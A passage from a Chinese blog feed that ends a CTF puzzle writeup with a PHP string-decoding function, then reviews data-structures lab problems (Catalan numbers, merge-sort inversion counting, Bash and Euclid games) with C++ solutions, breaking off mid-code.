<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//rot13解密=&gt;字符串反转=&gt;base64解密=&gt;每个字符的ASCII减1=&gt;反转字符串</span></span><br><span class="line">$miwen=<span class="string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    $_o = base64_decode(strrev(str_rot13($str)));</span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;  <span class="comment">//2.每个字符ascii+1</span></span><br><span class="line">        </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>); </span><br><span class="line">        $__=ord($_c)<span class="number">-1</span>; </span><br><span class="line">        $_c=chr($__); </span><br><span class="line">        $_=$_.$_c;    </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> strrev($_);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> decode($miwen);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到：<br><img src="/2019/05/21/攻防世界Web/20190903170541198.png" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>Writeup</category>
      </categories>
      <tags>
        <tag>Writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构实验复习</title>
    <url>/2019/10/20/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AE%9E%E9%AA%8C%E5%A4%8D%E4%B9%A0/</url>
    <content><![CDATA[<p>为了复习数据结构实验考试，将OJ题目再过一遍吧…不要问我为什么大三才考这个，这就是转专业的魅力~~</p>
<h1 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h1><h3 id="问题-A-判断三角形形状"><a href="#问题-A-判断三角形形状" class="headerlink" title="问题 A: 判断三角形形状"></a>问题 A: 判断三角形形状</h3><h5 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h5><p>给你三角形的三条边，你能告诉我它是哪种三角形吗？<br>如果是直角三角形，请输出“good”。如果是等腰三角形，请输出“perfect”。否则，请输出“just a triangle”。<br>题目保证输入数据合法。</p>
<h5 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h5><p>输入的第一行为一个整数t，表示测试样例的数量。<br>每组样例包含了三个整数a,b,c，代表了三角形的三条边的长度。（0&lt;a,b,c&lt;300）</p>
<h5 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h5><p>对于每组样例，输出结果，每组结果占一行。<br>样例输入<br><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line"><span class="symbol">3 </span><span class="number">4</span> <span class="number">5</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">2</span> <span class="number">3</span> </span><br><span class="line"><span class="symbol">1 </span><span class="number">4</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">6</span> <span class="number">3</span></span><br></pre></td></tr></table></figure></p>
<h5 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">good</span><br><span class="line">perfect</span><br><span class="line">perfect</span><br><span class="line">just <span class="selector-tag">a</span> triangle</span><br></pre></td></tr></table></figure>
<h5 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h5><p>没啥好说的，基础题</p>
<h5 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">Judge</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">string</span> type = <span class="string">"just a triangle"</span>;</span><br><span class="line">	<span class="keyword">if</span> (x == y || x == z || y == z)</span><br><span class="line">		type = <span class="string">"perfect"</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (x*x == y * y + z * z || x * x + y * y == z * z || x * x + z * z == y * y)</span><br><span class="line">		type = <span class="string">"good"</span>;</span><br><span class="line">	<span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> x, y, z;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; x &gt;&gt; y &gt;&gt; z;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; Judge(x, y, z) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-B-笨鸟先飞"><a href="#问题-B-笨鸟先飞" class="headerlink" title="问题 B: 笨鸟先飞"></a>问题 B: 笨鸟先飞</h3><h5 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h5><p>多多是一只小菜鸟，都说笨鸟先飞，多多也想来个菜鸟先飞。于是它从0点出发，一开始的飞行速度为1m/s，每过一个单位时间多多的飞行速度比上一个单位时间的飞行速度快2m/s，问n（0&lt;n&lt;10^5）个单位时间之后多多飞了多远?</p>
<h5 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h5><p>先输入一个整数T表示有几组数据。每组数据输入一个n，表示多多飞行的时间。</p>
<h5 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h5><p>输出多多飞行了多远，因为数字很大，所以对10000取模。</p>
<h5 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h5><p>第<code>i+1</code>个单位时间的速度为<code>1+2*i</code>，累和一下就行了，注意要模10000取余</p>
<h5 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; t;</span><br><span class="line">	<span class="keyword">while</span> (t--)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			sum += (<span class="number">1</span> + <span class="number">2</span> * i) % <span class="number">10000</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; sum % <span class="number">10000</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-C-火车出站"><a href="#问题-C-火车出站" class="headerlink" title="问题 C: 火车出站*"></a>问题 C: 火车出站*</h3><h5 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h5><p>铁路进行列车调度时，常把站台设计成栈式结构的站台，试问：<br>设有编号为1到n的n辆列车，顺序开入栈式结构的站台，则可能的出栈序列有多少种？</p>
<h5 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h5><p>输入包含多组测试数据。每组为一个正整数n（1&lt;=n&lt;=20），表示有n辆列车。</p>
<h5 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h5><p>输出可能的出栈序列有多少种。</p>
<h5 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">14</span></span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h5><p>火车出栈问题，书上给出了公式，带公式即可。</p>
<h5 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> t[<span class="number">20</span>]; </span><br><span class="line">	t[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">20</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		t[i] = t[i - <span class="number">1</span>] * (<span class="number">4</span> * i - <span class="number">2</span>) / (i + <span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; t[n] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="问题-D-最少的交换"><a href="#问题-D-最少的交换" class="headerlink" title="问题 D: 最少的交换*"></a>问题 D: 最少的交换*</h3><h5 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h5><p>现在给你一个由n个互不相同的整数组成的序列，现在要求你任意交换相邻的两个数字，使序列成为升序序列，请问最少的交换次数是多少？</p>
<h5 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h5><p>输入包含多组测试数据。每组输入第一行是一个正整数n（n&lt;500000），表示序列的长度，当n=0时。<br>接下来的n行，每行一个整数a[i]（0&lt;=a[i]&lt;=999999999），表示序列中第i个元素。</p>
<h5 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h5><p>对于每组输入，输出使得所给序列升序的最少交换次数。</p>
<h5 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line"><span class="number">6</span></span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h5><p>利用归并排序，将已有序的子序列合并，得到完全有序的序列，即用分治法解决。</p>
<p>先使每个子序列（前半部分和后半部分）有序，再使子序列段间有序，前后两部分两两比较，将两个有序表合并成一个有序表。</p>
<h5 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> sum;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">500010</span>], b[<span class="number">500010</span>];</span><br><span class="line"><span class="comment">//将两个有序表合并为一个有序表</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Merge</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> low, <span class="keyword">int</span> mid, <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = low, j = mid + <span class="number">1</span>, k = low;</span><br><span class="line">	<span class="keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= high)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (a[i] &lt;= a[j])</span><br><span class="line">		&#123;</span><br><span class="line">			b[k++] = a[i++];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			sum += j - k;	<span class="comment">// 每当后段的数组元素提前时，记录提前的距离</span></span><br><span class="line">			b[k++] = a[j++];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (i &lt;= mid)		<span class="comment">//若左半部分还有剩余</span></span><br><span class="line">	&#123;</span><br><span class="line">		b[k++] = a[i++];	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (j &lt;= high)		<span class="comment">//若右半部分还有剩余</span></span><br><span class="line">	&#123;</span><br><span class="line">		b[k++] = a[j++];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (i = low; i &lt;= high; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		a[i] = b[i];</span><br><span class="line">	&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MergeSort</span><span class="params">(<span class="keyword">int</span> a[], <span class="keyword">int</span> low, <span class="keyword">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (low &lt; high)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">int</span> mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">		MergeSort(a, low, mid);			<span class="comment">//使左半部分有序</span></span><br><span class="line">		MergeSort(a, mid + <span class="number">1</span>, high);	<span class="comment">//使右半部分有序</span></span><br><span class="line">		Merge(a, low, mid, high);		<span class="comment">//进行归并</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; n)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (n == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		sum = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">cin</span> &gt;&gt; a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		MergeSort(a, <span class="number">0</span>, n - <span class="number">1</span>);</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-E-欧几里得游戏"><a href="#问题-E-欧几里得游戏" class="headerlink" title="问题 E: 欧几里得游戏"></a>问题 E: 欧几里得游戏</h3><h5 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h5><p>小明和小红在玩欧几里得游戏。他们从两个自然数开始，第一个玩家小明，从两个数的较大数中减去较小数的尽可能大的正整数倍，只要差为非负即可。然后，第二个玩家小红，对得到的两个数进行同样的操作，然后又是小明。就这样轮流进行游戏，直至某个玩家将较大数减去较小数的某个倍数之后差为0为止，此时游戏结束，该玩家就是胜利者。</p>
<h5 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h5><p>输入包含多组测试数据。每组输入两个正整数，表示游戏一开始的两个数，游戏总是小明先开始。<br>当输入两个0的时候，输入结束。</p>
<h5 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h5><p>对于每组输入，输出最后的胜者，我们认为他们两个都是顶尖高手，每一步游戏都做出了最佳的选择。<br>具体输出格式见输出样例。</p>
<h5 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">34 </span><span class="number">12</span></span><br><span class="line"><span class="symbol">15 </span><span class="number">24</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">0</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">xiaoming wins</span></span><br><span class="line"><span class="attribute">xiaohong wins</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h5><p>关于博弈论的一道题，有点难…</p>
<p>参考这篇文章：<a href="https://blog.csdn.net/winter2121/article/details/81950819" target="_blank" rel="noopener">https://blog.csdn.net/winter2121/article/details/81950819</a></p>
<h5 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a, b;</span><br><span class="line">	<span class="keyword">int</span> count;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; a &gt;&gt; b)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (a == <span class="number">0</span> || b == <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		count = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> (a == b)</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"xiaoming wins"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">while</span> (a != b)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (a &lt; b)	</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">int</span> temp = a;</span><br><span class="line">					a = b;</span><br><span class="line">					b = temp;</span><br><span class="line">				&#125;</span><br><span class="line">				count++;</span><br><span class="line">				<span class="keyword">if</span> (a / b != <span class="number">1</span>)</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				a = a % b;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (count % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">"xiaohong wins"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="built_in">cout</span> &lt;&lt; <span class="string">"xiaoming wins"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-F-取石子游戏"><a href="#问题-F-取石子游戏" class="headerlink" title="问题 F: 取石子游戏"></a>问题 F: 取石子游戏</h3><h5 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h5><p>一天小明和小红在玩取石子游戏，游戏规则是这样的：<br>（1）本游戏是一个二人游戏；<br>（2）有一堆石子，共有n个；<br>（3）两人轮流进行；<br>（4）每走一步可以取走1~m个石子；<br>（5）最先取光石子的一方为胜。<br>如果游戏的双方使用的都是最优策略，请输出哪个人能赢。</p>
<h5 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h5><p>输入的第一行是一个正整数C（C&lt;=100），表示有C组测试数据。<br>每组输入两个整数n和m（1&lt;=n,m&lt;=1000），n和m的含义见题目描述。</p>
<h5 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h5><p>对于每组输入，如果先走的人能赢，请输出“first”，否则请输出“second”。</p>
<h5 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span></span><br><span class="line"><span class="symbol">23 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">3</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">first</span></span><br><span class="line"><span class="keyword">second</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h5><p>巴什博奕问题</p>
<ul>
<li><p>如果n=m+1，由于一次最多只能取m个，所以，无论先取者拿走多少个，后取者都能够一次拿走剩余的物品，后者取胜。</p>
</li>
<li><p>因此如果n=（m+1）r+s，（r为任意自然数，s≤m),那么先取者要拿走s个物品，如果后取者拿走k（≤m)个，那么先取者再拿走m+1-k个，结果剩下（m+1）（r-1）个，以后保持这样的取法，那么先取者肯定获胜。</p>
</li>
<li>总之，要保持给对手留下（m+1）的倍数，就能最后获胜，即若n使m+1的倍数，则后取着胜，反之，存在先取者获胜的取法。</li>
</ul>
<h5 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> c, n, m;</span><br><span class="line">	<span class="built_in">cin</span> &gt;&gt; c;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; c; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cin</span> &gt;&gt; n &gt;&gt; m;</span><br><span class="line">		<span class="keyword">if</span> (n % (m + <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"first"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; <span class="string">"second"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="问题-G-奥运排序问题"><a href="#问题-G-奥运排序问题" class="headerlink" title="问题 G: 奥运排序问题"></a>问题 G: 奥运排序问题</h3><h5 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h5><p>按要求，给国家进行排名。</p>
<h5 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h5><p>有多组数据。<br>第一行给出国家数N，要求排名的国家数M，国家号从0到N-1。<br>第二行开始的N行给定国家或地区的奥运金牌数，奖牌数，人口数（百万）。<br>接下来一行给出M个国家号。</p>
<h5 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h5><p>排序有4种方式: 金牌总数 奖牌总数 金牌人口比例 奖牌人口比例<br>对每个国家给出最佳排名排名方式 和 最终排名<br>格式为: 排名:排名方式<br>如果有相同的最终排名，则输出排名方式最小的那种排名，对于排名方式，金牌总数 &lt; 奖牌总数 &lt; 金牌人口比例 &lt; 奖牌人口比例<br>如果有并列排名的情况，即如果出现金牌总数为 100,90,90,80.则排名为1,2,2,4.<br>每组数据后加一个空行。</p>
<h5 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">4 </span><span class="number">4</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">8</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">6 </span><span class="number">6</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">8</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">2 </span><span class="number">12</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">1</span> <span class="number">2</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">4 </span><span class="number">2</span></span><br><span class="line"><span class="symbol">8 </span><span class="number">10</span> <span class="number">1</span></span><br><span class="line"><span class="symbol">8 </span><span class="number">11</span> <span class="number">2</span></span><br><span class="line"><span class="symbol">8 </span><span class="number">12</span> <span class="number">3</span></span><br><span class="line"><span class="symbol">8 </span><span class="number">13</span> <span class="number">4</span></span><br><span class="line"><span class="symbol">0 </span><span class="number">3</span></span><br></pre></td></tr></table></figure>
<h5 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight css"><table><tr><td class="code"><pre><span class="line">1<span class="selector-pseudo">:3</span></span><br><span class="line">1<span class="selector-pseudo">:1</span></span><br><span class="line">2<span class="selector-pseudo">:1</span></span><br><span class="line">1<span class="selector-pseudo">:2</span></span><br><span class="line"></span><br><span class="line">1<span class="selector-pseudo">:1</span></span><br><span class="line">1<span class="selector-pseudo">:1</span></span><br></pre></td></tr></table></figure>
<h5 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h5><p>利用sort()按四种排名方式分别对需要排名的国家进行排名，并记录在一个二维数组中，</p>
<h5 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h5><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> s = <span class="number">1005</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Country</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">double</span> g, j, p;</span><br><span class="line">	<span class="keyword">int</span> id;</span><br><span class="line">&#125;c[s];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmpg</span><span class="params">(Country x, Country y)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x.g &gt; y.g;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmpj</span><span class="params">(Country x, Country y)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x.j &gt; y.j;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span 